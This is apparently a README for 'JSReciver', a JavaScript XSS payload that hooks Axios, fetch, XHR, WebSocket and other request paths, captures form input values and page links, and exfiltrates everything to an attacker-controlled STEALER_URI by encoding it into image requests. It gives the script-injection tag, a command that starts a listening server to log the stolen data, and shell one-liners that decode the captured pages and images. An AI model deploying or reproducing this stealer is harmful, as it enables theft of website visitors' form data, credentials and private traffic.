# JSReciver

### JSReciver v0.0 - @j0moz4 

This JavaScript script intercepts various types of HTTP requests made by different libraries and frameworks, such as:

 - Axios
 - Angular HttpClient
 - jQuery Ajax
 - Superagent
 - Request
 - Got
 - Fetch Mock
 - Vue Resource. 
 
It replaces the original functions used for making requests with modified versions that log information about the requests. The intercepted requests are logged by printing their details, such as the request URL, method, headers, and data, to the console. Additionally, the script includes a function called stealInfo that exfiltrates the intercepted request information to a specified URL. It does so by encoding the request data and sending it as a series of images loaded from the exfiltration URL.
The script also intercepts other web-related operations, such as: 

 - WebSocket connections
 - Beacon requests
 - XMLHttpRequests
 - Fetch API requests. 

It logs information about these operations and exfiltrates them in a similar manner as the intercepted HTTP requests. 
Furthermore, the script scans the webpage for elements with src or href attributes and logs and exfiltrates their values. It also collects data from HTML forms present on the page, including form actions, methods, and input field values. The form data is then logged and exfiltrated as well.
Overall, this script acts as a data interception and exfiltration tool, capturing and potentially sending sensitive information from various web requests and webpage elements to a specified exfiltration URL.

### CREATE WEB SERVER

```Edit the var "let STEALER_URI = '';" to your exfiltrationi server URI.```

#### Prepare server:
[https://www.npmjs.com/package/http-server](https://www.npmjs.com/package/http-server)

```sudo http-server --port 8080 -a 0.0.0.0 -d -i --cors > exfiLeaks.log```

##### Inject: **<script src="http://STEALER_URI:8080/reciver.js"></script>**

### JSREVICER ONELINERS:

#### Detect webpages hash:
```cat exfiLeaks.log | grep "/0/PCFET0NUWVBFIGh0bWw" | awk -F'/' '{print $3}' | awk '!seen[$1]++'```
#### Web pages:
```cat exfiLeaks.log | grep "/exfil/<hash>/" | cut -d"/" -f4- |  awk '!seen[$1]++' | awk -F'.jpg' '{print $1}' | cut -d"/" -f2- | tr -d '\n' | base64 -d```

#### Detect images hash
```cat exfiLeaks.log | grep "/0/iVBORw0KGg" | awk -F'/' '{print $3}' | awk '!seen[$1]++'```
#### Images: 
```cat exfiLeaks.log | awk -F'/exfil/<hash>/' '{print $2}' | cut -d"/" -f2- | awk -F'.jpg' '{print $1}' | awk '!seen[$0]++' | tr -d '\n' | base64 -d > tal.png```

______________________________________________________________________________________________________________________________________________

## POC

##### Start server
![image alt](https://i.imgur.com/EbKGAvu.png "0")

##### Request recived
![image alt](https://i.imgur.com/l7lSTnP.png "1")

##### Extract content 
![image alt](https://i.imgur.com/QlSzAlB.png "2")


**Thnx to:** [https://github.com/hoodoer/XSS-Data-Exfil](https://github.com/hoodoer/XSS-Data-Exfil)
